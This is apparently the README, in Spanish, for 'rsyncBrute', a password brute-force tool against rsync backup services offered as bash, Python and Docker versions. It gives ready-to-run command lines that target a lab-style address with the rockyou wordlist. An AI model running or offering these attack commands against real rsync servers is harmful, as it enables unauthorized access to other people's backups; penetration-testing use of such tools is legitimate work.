# rsyncBrute
Este script permite realizar ataques de fuerza bruta a cualquier servicio de copias de seguridad rsync, ¡tanto IPv4 como IPv6!, se puede ejecutar de forma interactiva (introduciendo parametros uno por uno) o de forma no interactiva (ideal para automatizar). Está disponible en bash, python3 y como imagen docker. Se lanza exactamente igual en sus tres versiones:
  - 
https://hub.docker.com/r/santatecla/rsync-brute (148MB)

Mostrar ayuda:
```
./rsync-brute.sh -h
python3 rsync-brute.py -h
docker run -it santatecla/rsync-brute -h
```
Modo interactivo:
```
./rsync-brute.sh -i
python3 rsync-brute.py -i
docker run -it santatecla/rsync-brute -i
```
Modo no interactivo:
```
./rsync-brute.sh -4 bender@10.10.10.111:873/module -w /usr/share/wordlists/rockyou.txt
python3 rsync-brute.py -4 bender@10.10.10.111:873/module -w /usr/share/wordlists/rockyou.txt
docker run -it santatecla/rsync-brute -4 bender@10.10.10.111:873/module -w /usr/share/wordlists/rockyou.txt
```
La imagen docker también contiene el diccionario rockyou en /usr/share/wordlists/rockyou.txt
